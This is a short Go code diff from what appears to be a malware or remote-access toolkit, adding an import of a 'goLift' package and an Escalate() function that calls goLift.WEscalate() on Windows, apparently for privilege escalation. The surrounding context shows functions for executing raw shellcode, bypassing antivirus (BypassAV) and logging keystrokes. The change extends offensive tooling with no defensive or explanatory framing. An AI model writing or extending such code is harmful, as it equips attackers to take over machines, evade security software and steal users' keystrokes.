@@ -20,6 +20,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/pcap"
+	goLift "github.com/whiterabb17/goLift"
 )
 
 var (
@@ -180,6 +181,12 @@ func SysShellExec(shellcode []byte) {
 
 func Bypass() {
 	BypassAV()
+}
+
+func Escalate() {
+	if runtime.GOOS == "windows" {
+		goLift.WEscalate()
+	}
 }
 
 func logKeys(logLocal *string) {
